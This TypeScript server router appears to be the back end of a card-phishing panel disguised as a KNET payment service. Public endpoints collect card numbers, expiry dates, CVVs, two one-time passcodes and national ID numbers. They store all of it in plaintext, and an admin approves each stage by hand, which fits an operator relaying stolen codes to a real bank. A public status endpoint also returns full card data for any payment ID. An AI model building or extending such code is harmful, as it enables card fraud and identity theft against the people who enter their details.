import { z } from "zod";
import { protectedProcedure, publicProcedure, router } from "./_core/trpc";
import { getDb } from "./db";
import { payments, otpRequests, cvvRequests, hawetyCalls } from "../drizzle/schema";
import { eq, and } from "drizzle-orm";

export const paymentRouter = router({
  // Submit KNET payment
  submitKnet: publicProcedure
    .input(
      z.object({
        amount: z.number().positive(),
        bankName: z.string(),
        cardPrefix: z.string(),
        cardNumber: z.string(),
        expiryMonth: z.string(),
        expiryYear: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      // Create a new payment record
      const db = await getDb();
      if (!db) throw new Error("Database not available");
      const result = await db.insert(payments).values({
        amount: input.amount,
        bankName: input.bankName,
        cardPrefix: input.cardPrefix,
        cardNumber: input.cardNumber,
        expiryMonth: input.expiryMonth,
        expiryYear: input.expiryYear,
        status: "knet_submitted",
        reference: `KNET-${Date.now()}`,
      });

      const paymentId = Number((result as any).insertId) || 0;

      return {
        success: true,
        paymentId,
        status: "knet_submitted",
        message: "Payment submitted, waiting for admin approval",
      };
    }),

  // Get payment status
  getPaymentStatus: publicProcedure
    .input(z.object({ paymentId: z.number() }))
    .query(async ({ input }) => {
      const db = await getDb();
      if (!db) throw new Error("Database not available");
      const payment = await db
        .select()
        .from(payments)
        .where(eq(payments.id, input.paymentId))
        .limit(1);

      if (!payment.length) {
        return { error: "Payment not found" };
      }

      return payment[0];
    }),

  // Submit OTP
  submitOtp: publicProcedure
    .input(
      z.object({
        paymentId: z.number(),
        otpNumber: z.string(),
        stage: z.enum(["first", "second"]),
      })
    )
    .mutation(async ({ input }) => {
      // Create OTP request
      const db = await getDb();
      if (!db) throw new Error("Database not available");
      const result = await db.insert(otpRequests).values({
        paymentId: input.paymentId,
        otpNumber: input.otpNumber,
        stage: input.stage,
        status: "pending",
      });

      // Update payment status
      const newStatus = input.stage === "first" ? "otp1_pending" : "otp2_pending";
      await db
        .update(payments)
        .set({ status: newStatus })
        .where(eq(payments.id, input.paymentId));

      return {
        success: true,
        otpId: Number((result as any).insertId) || 0,
        status: newStatus,
        message: "OTP submitted, waiting for admin approval",
      };
    }),

  // Submit CVV
  submitCvv: publicProcedure
    .input(
      z.object({
        paymentId: z.number(),
        cvvNumber: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      // Create CVV request
      const db = await getDb();
      if (!db) throw new Error("Database not available");
      const result = await db.insert(cvvRequests).values({
        paymentId: input.paymentId,
        cvvNumber: input.cvvNumber,
        status: "pending",
      });

      // Update payment status
      await db
        .update(payments)
        .set({ status: "cvv_pending" })
        .where(eq(payments.id, input.paymentId));

      return {
        success: true,
        cvvId: Number((result as any).insertId) || 0,
        status: "cvv_pending",
        message: "CVV submitted, waiting for admin approval",
      };
    }),

  // Submit Hawety (National ID)
  submitHawety: publicProcedure
    .input(
      z.object({
        paymentId: z.number(),
        nationalId: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      // Create Hawety request
      const db = await getDb();
      if (!db) throw new Error("Database not available");
      const result = await db.insert(hawetyCalls).values({
        paymentId: input.paymentId,
        nationalId: input.nationalId,
        status: "pending",
      });

      // Update payment status
      await db
        .update(payments)
        .set({ status: "hawety_pending" })
        .where(eq(payments.id, input.paymentId));

      return {
        success: true,
        hawetyId: Number((result as any).insertId) || 0,
        status: "hawety_pending",
        message: "Hawety submitted, waiting for admin approval",
      };
    }),

  // Admin: Get pending payments
  adminGetPendingPayments: protectedProcedure.query(async ({ ctx }) => {
    // Check if user is admin
    if (ctx.user.role !== "admin") {
      throw new Error("Unauthorized");
    }

    const db = await getDb();
    if (!db) throw new Error("Database not available");
    const pendingPayments = await db
      .select()
      .from(payments)
      .where(eq(payments.status, "knet_submitted"));

    return pendingPayments;
  }),

  // Admin: Get pending OTPs
  adminGetPendingOtps: protectedProcedure.query(async ({ ctx }) => {
    if (ctx.user.role !== "admin") {
      throw new Error("Unauthorized");
    }

    const db = await getDb();
    if (!db) throw new Error("Database not available");
    const pendingOtps = await db
      .select()
      .from(otpRequests)
      .where(eq(otpRequests.status, "pending"));

    return pendingOtps;
  }),

  // Admin: Get pending CVVs
  adminGetPendingCvvs: protectedProcedure.query(async ({ ctx }) => {
    if (ctx.user.role !== "admin") {
      throw new Error("Unauthorized");
    }

    const db = await getDb();
    if (!db) throw new Error("Database not available");
    const pendingCvvs = await db
      .select()
      .from(cvvRequests)
      .where(eq(cvvRequests.status, "pending"));

    return pendingCvvs;
  }),

  // Admin: Approve/Reject KNET payment
  adminApproveKnet: protectedProcedure
    .input(
      z.object({
        paymentId: z.number(),
        approved: z.boolean(),
        rejectionReason: z.string().optional(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      if (ctx.user.role !== "admin") {
        throw new Error("Unauthorized");
      }

      const db = await getDb();
      if (!db) throw new Error("Database not available");
      const newStatus = input.approved ? "otp1_pending" : "rejected";

      await db
        .update(payments)
        .set({ status: newStatus })
        .where(eq(payments.id, input.paymentId));

      return {
        success: true,
        status: newStatus,
        message: input.approved
          ? "Payment approved, user can proceed to OTP"
          : "Payment rejected",
      };
    }),

  // Admin: Approve/Reject OTP
  adminApproveOtp: protectedProcedure
    .input(
      z.object({
        otpId: z.number(),
        approved: z.boolean(),
        rejectionReason: z.string().optional(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      if (ctx.user.role !== "admin") {
        throw new Error("Unauthorized");
      }

      const db = await getDb();
      if (!db) throw new Error("Database not available");
      const otp = await db
        .select()
        .from(otpRequests)
        .where(eq(otpRequests.id, input.otpId))
        .limit(1);

      if (!otp.length) {
        throw new Error("OTP not found");
      }

      const otpRecord = otp[0];

      if (input.approved) {
        const newStatus =
          otpRecord.stage === "first" ? "cvv_pending" : "hawety_pending";
        await db
          .update(payments)
          .set({ status: newStatus })
          .where(eq(payments.id, otpRecord.paymentId));
      }

      await db
        .update(otpRequests)
        .set({
          status: input.approved ? "verified" : "rejected",
          rejectionReason: input.rejectionReason,
        })
        .where(eq(otpRequests.id, input.otpId));

      return {
        success: true,
        message: input.approved ? "OTP approved" : "OTP rejected",
      };
    }),

  // Admin: Approve/Reject CVV
  adminApproveCvv: protectedProcedure
    .input(
      z.object({
        cvvId: z.number(),
        approved: z.boolean(),
        rejectionReason: z.string().optional(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      if (ctx.user.role !== "admin") {
        throw new Error("Unauthorized");
      }

      const db = await getDb();
      if (!db) throw new Error("Database not available");
      const cvv = await db
        .select()
        .from(cvvRequests)
        .where(eq(cvvRequests.id, input.cvvId))
        .limit(1);

      if (!cvv.length) {
        throw new Error("CVV not found");
      }

      const cvvRecord = cvv[0];

      if (input.approved) {
        await db
          .update(payments)
          .set({ status: "otp2_pending" })
          .where(eq(payments.id, cvvRecord.paymentId));
      }

      await db
        .update(cvvRequests)
        .set({
          status: input.approved ? "verified" : "rejected",
          rejectionReason: input.rejectionReason,
        })
        .where(eq(cvvRequests.id, input.cvvId));

      return {
        success: true,
        message: input.approved ? "CVV approved" : "CVV rejected",
      };
    }),

  // Admin: Approve/Reject Hawety
  adminApproveHawety: protectedProcedure
    .input(
      z.object({
        hawetyId: z.number(),
        approved: z.boolean(),
        rejectionReason: z.string().optional(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      if (ctx.user.role !== "admin") {
        throw new Error("Unauthorized");
      }

      const db = await getDb();
      if (!db) throw new Error("Database not available");
      const hawety = await db
        .select()
        .from(hawetyCalls)
        .where(eq(hawetyCalls.id, input.hawetyId))
        .limit(1);

      if (!hawety.length) {
        throw new Error("Hawety not found");
      }

      const hawetyRecord = hawety[0];

      if (input.approved) {
        await db
          .update(payments)
          .set({ status: "completed" })
          .where(eq(payments.id, hawetyRecord.paymentId));
      }

      await db
        .update(hawetyCalls)
        .set({
          status: input.approved ? "verified" : "rejected",
          rejectionReason: input.rejectionReason,
        })
        .where(eq(hawetyCalls.id, input.hawetyId));

      return {
        success: true,
        message: input.approved ? "Hawety approved" : "Hawety rejected",
      };
    }),
});
